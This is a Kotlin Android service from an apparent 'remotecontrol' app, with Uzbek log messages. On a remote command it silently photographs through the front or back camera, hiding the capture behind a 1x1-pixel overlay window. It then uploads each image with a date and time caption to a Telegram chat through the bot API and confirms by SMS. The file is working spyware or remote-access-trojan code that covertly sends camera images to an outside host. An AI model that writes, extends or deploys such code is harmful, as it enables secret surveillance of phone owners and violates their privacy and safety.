package com.example.remotecontrol

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Log
import android.view.WindowManager
import android.view.SurfaceView
import android.view.SurfaceHolder
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class CameraService : Service() {

    companion object {
        var isRunning = false
    }

    private lateinit var replyTo: String
    private var cameraFacing: Int = CameraCharacteristics.LENS_FACING_BACK
    private lateinit var cameraManager: CameraManager
    private lateinit var imageReader: ImageReader
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread
    private var cameraDevice: CameraDevice? = null
    private var windowManager: WindowManager? = null
    private var surfaceView: SurfaceView? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) { 
            android.util.Log.w("CameraService", "Allaqachon ishlayapti, o'tkazib yuborildi")
            return START_NOT_STICKY 
        }
        isRunning = true
        replyTo = intent?.getStringExtra("reply_to") ?: ""
        val camera = intent?.getStringExtra("camera") ?: "back"
        cameraFacing = if (camera == "front") CameraCharacteristics.LENS_FACING_FRONT
                       else CameraCharacteristics.LENS_FACING_BACK

        startBackgroundThread()
        addOverlayWindow()
        return START_NOT_STICKY
    }

    private fun addOverlayWindow() {
        try {
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

            surfaceView = SurfaceView(this)

            val params = WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )

            windowManager?.addView(surfaceView, params)

            surfaceView?.holder?.addCallback(object : SurfaceHolder.Callback {
                override fun surfaceCreated(holder: SurfaceHolder) {
                    takePicture(holder)
                }
                override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
                override fun surfaceDestroyed(holder: SurfaceHolder) {}
            })

        } catch (e: Exception) {
            Log.w("CameraService", "Overlay ishlamadi, preview siz urinmoqda")
            takePictureWithoutPreview()
        }
    }

    private fun takePicture(holder: SurfaceHolder) {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == cameraFacing
            } ?: cameraManager.cameraIdList[0]

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                val file = saveImage(bytes)
                CommandHandler(this).sendSms(replyTo, "📸 Rasm olindi!")
                val cameraName = if (cameraFacing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) "🤳 Oldi kamera" else "📷 Orqa kamera"
                val date = java.text.SimpleDateFormat("dd.MM.yyyy", java.util.Locale.getDefault()).format(java.util.Date())
                val clock = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                val caption = "$cameraName\n📅 $date\n🕐 $clock"
                sendPhotoToTelegram(replyTo, file.absolutePath, caption)
                cleanup()
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surfaces = listOf(imageReader.surface, holder.surface)
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)

                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            cleanup()
                        }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { cleanup() }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraService", "Kamera xato: $error")
                    CommandHandler(this@CameraService).sendSms(replyTo, "❌ Kamera xato: $error")
                    cleanup()
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            CommandHandler(this).sendSms(replyTo, "❌ Kamera ruxsati yo'q")
            cleanup()
        } catch (e: Exception) {
            Log.e("CameraService", "Xato: ${e.message}")
            cleanup()
        }
    }

    private fun takePictureWithoutPreview() {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == cameraFacing
            } ?: cameraManager.cameraIdList[0]

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                val file = saveImage(bytes)
                CommandHandler(this).sendSms(replyTo, "📸 Rasm olindi!")
                val cameraName = if (cameraFacing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) "🤳 Oldi kamera" else "📷 Orqa kamera"
                val date = java.text.SimpleDateFormat("dd.MM.yyyy", java.util.Locale.getDefault()).format(java.util.Date())
                val clock = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                val photoCaption = "$cameraName | 📅 $date | 🕐 $clock"
                sendPhotoToTelegram(replyTo, file.absolutePath, photoCaption)
                cleanup()
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)
                    camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { cleanup() }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { cleanup() }
                override fun onError(camera: CameraDevice, error: Int) { cleanup() }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e("CameraService", "Xato: ${e.message}")
            cleanup()
        }
    }

    private fun saveImage(bytes: ByteArray): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val file = File(getExternalFilesDir(null), "RC_$timestamp.jpg")
        FileOutputStream(file).use { it.write(bytes) }
        return file
    }

    private fun cleanup() {
        isRunning = false
        try {
            cameraDevice?.close()
            windowManager?.removeView(surfaceView)
        } catch (_: Exception) {}
        backgroundThread.quitSafely()
        stopSelf()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread.looper)
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        try { backgroundThread.quitSafely() } catch (_: Exception) {}
    }

    private fun sendPhotoToTelegram(chatId: String, photoPath: String, caption: String = "") {
        Thread {
            try {
                val token = BuildConfig.TELEGRAM_BOT_TOKEN
                val file = java.io.File(photoPath)
                if (!file.exists()) return@Thread
                val CRLF = "\r\n"
                val boundary = "Boundary${System.currentTimeMillis()}"
                val url = java.net.URL("https://api.telegram.org/bot$token/sendPhoto")
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.doOutput = true
                val os = java.io.DataOutputStream(conn.outputStream)
                os.writeBytes("--$boundary$CRLF")
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$CRLF$CRLF")
                os.writeBytes("$chatId$CRLF")
                os.writeBytes("--$boundary$CRLF")
                os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"$CRLF")
                os.writeBytes("Content-Type: image/jpeg$CRLF$CRLF")
                os.write(file.readBytes())
                os.writeBytes(CRLF)
                if (caption.isNotEmpty()) {
                    os.writeBytes("--$boundary$CRLF")
                    os.writeBytes("Content-Disposition: form-data; name=\"caption\"$CRLF")
                    os.writeBytes("Content-Type: text/plain; charset=UTF-8$CRLF$CRLF")
                    os.write(caption.toByteArray(Charsets.UTF_8))
                    os.writeBytes(CRLF)
                }
                os.writeBytes("--$boundary--$CRLF")
                os.flush()
                val code = conn.responseCode
                val stream = if (code >= 400) conn.errorStream else conn.inputStream
                val resp = stream?.bufferedReader()?.readText() ?: ""
                android.util.Log.d("CameraService", "Rasm yuborildi: code=$code resp=${resp.take(200)}")
            } catch (e: Exception) {
                android.util.Log.e("CameraService", "Rasm xatosi: ${e.message}")
                android.util.Log.e("CameraService", "Stack: ${e.stackTraceToString().take(200)}")
            }
        }.start()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
